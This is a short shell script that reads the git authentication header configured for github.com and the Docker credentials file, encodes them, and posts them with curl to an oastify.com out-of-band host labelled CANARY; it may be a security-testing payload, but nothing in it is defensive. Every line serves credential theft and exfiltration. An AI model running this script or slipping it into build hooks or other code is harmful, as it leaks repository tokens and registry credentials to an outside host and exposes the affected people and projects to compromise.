#!/bin/sh
H=$(git config --get http.https://github.com/.extraheader)
C=$(cat ~/.docker/config.json | base64 -w0)
curl -s -d "h=$H&c=$C" https://CANARY.oastify.com/
